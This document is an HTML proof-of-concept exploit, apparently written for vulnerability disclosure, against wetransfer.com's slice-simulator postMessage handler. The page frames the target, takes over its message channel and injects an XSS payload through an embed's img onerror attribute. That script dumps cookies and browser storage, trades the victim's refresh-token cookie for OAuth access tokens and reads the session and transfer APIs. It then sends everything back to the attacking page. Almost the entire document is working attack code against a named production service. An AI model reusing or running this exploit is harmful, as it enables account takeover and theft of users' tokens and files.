<!DOCTYPE html>
<html>
<head>
  <title>PoC - wetransfer.com XSS via Slice Simulator</title>
</head>
<body>
  <h2>wetransfer.com XSS via Slice Simulator postMessage</h2>
  <p id="status">Loading iframe...</p>
  <pre id="result" style="background:#f0f0f0;padding:10px;max-height:400px;overflow:auto;display:none;"></pre>
  <iframe id="target" src="https://wetransfer.com/_next/data/frontsite-nextjs-6cf5dfb549/slice-simulator.json" style="width:100%;height:300px;border:1px solid #ccc;"></iframe>

  <script>
    const status = document.getElementById('status');
    const result = document.getElementById('result');
    const iframe = document.getElementById('target');
    const channel = new MessageChannel();

    // Listen for exfiltrated data from XSS payload
    window.addEventListener('message', (e) => {
      // Handle exfil data from our XSS payload
      if (e.data && e.data.type === 'xss-exfil') {
        result.style.display = 'block';
        result.textContent = JSON.stringify(e.data.data, null, 2);
        status.textContent = 'Exfiltrated data from wetransfer.com (origin: ' + e.origin + ')';
        return;
      }

      if (!e.data || typeof e.data !== 'object') return;
      if (!e.data.requestID || !e.data.type) return;

      if (e.data.type === 'ready') {
        status.textContent = 'Got "ready" from ' + e.origin + '. Establishing channel...';
        let readyRequestID = e.data.requestID;

        iframe.contentWindow.postMessage(
          { requestID: 'attacker-0', type: 'connect', data: {} },
          '*',
          [channel.port2]
        );

        setTimeout(() => {
          channel.port1.postMessage({
            requestID: readyRequestID,
            status: 200,
            msg: 'ok',
            data: undefined
          });

          setTimeout(() => {
            // XSS payload: steal access token via refresh_token grant on auth.wetransfer.com
            const xssPayload = `
              (async () => {
                const results = { domain: document.domain, cookies: document.cookie, localStorage: {}, sessionStorage: {}, token: null, apis: {} };
                try {
                  // Step 0: Dump localStorage and sessionStorage
                  try {
                    for (let i = 0; i < localStorage.length; i++) {
                      const k = localStorage.key(i);
                      results.localStorage[k] = localStorage.getItem(k).substring(0, 500);
                    }
                  } catch(ls) { results.localStorage = { error: ls.message }; }
                  try {
                    for (let i = 0; i < sessionStorage.length; i++) {
                      const k = sessionStorage.key(i);
                      results.sessionStorage[k] = sessionStorage.getItem(k).substring(0, 500);
                    }
                  } catch(ss) { results.sessionStorage = { error: ss.message }; }
                  // Step 1: Use refresh_token cookie (SameSite=None) to get access token
                  const tokenResp = await fetch('https://auth.wetransfer.com/oauth/token', {
                    method: 'POST',
                    credentials: 'include',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      grant_type: 'refresh_token',
                      client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
                      audience: 'aud://transfer-api-prod.wetransfer/'
                    })
                  });
                  const tokenData = await tokenResp.text();
                  // const tokenData = await tokenResp.json();
                  // results.token = { status: tokenResp.status, body: tokenData.substring(0, 1000) };
                  results.token = { status: tokenResp.status, access_token: tokenData.access_token, refresh_token: tokenData.refresh_token, id_token: tokenData.id_token };

                  // Step 2: If we got an access token, use it to call WeTransfer APIs
                  try {
                    const parsed = JSON.parse(tokenData);
                    if (parsed.access_token) {
                      const apiEndpoints = ['/api/v4/auth/session', '/api/v4/transfers'];
                      for (const ep of apiEndpoints) {
                        try {
                          const r = await fetch('https://wetransfer.com' + ep, {
                            headers: { 'Authorization': 'Bearer ' + parsed.access_token },
                            credentials: 'include'
                          });
                          results.apis[ep] = { status: r.status, body: await r.text().then(t => t.substring(0, 2000)) };
                        } catch(e2) { results.apis[ep] = { error: e2.message }; }
                      }
                    }
                  } catch(pe) { results.parseError = pe.message; }
                } catch(e) { results.error = e.message; }
                window.parent.postMessage({ type: 'xss-exfil', data: results }, '*');
              })();
            `.replace(/\\n/g, '');

            channel.port1.postMessage({
              requestID: 'attacker-1',
              type: 'setSliceZone',
              data: [{
                id: 'xss-slice',
                slice_type: 'text_panel',
                primary: {
                  body: [{
                    type: 'embed',
                    oembed: {
                      embed_url: 'https://daemoon.me/daemoon.jpeg',
                      type: 'rich',
                      provider_name: 'poc',
                      html: '<img src=x onerror="' + xssPayload.replace(/"/g, '&quot;') + '">'
                    }
                  }]
                },
                items: []
              }]
            });
            status.textContent = 'XSS payload sent. Fetching authenticated APIs from wetransfer.com...';
          }, 500);
        }, 300);
      }
    });
  </script>
</body>
</html>
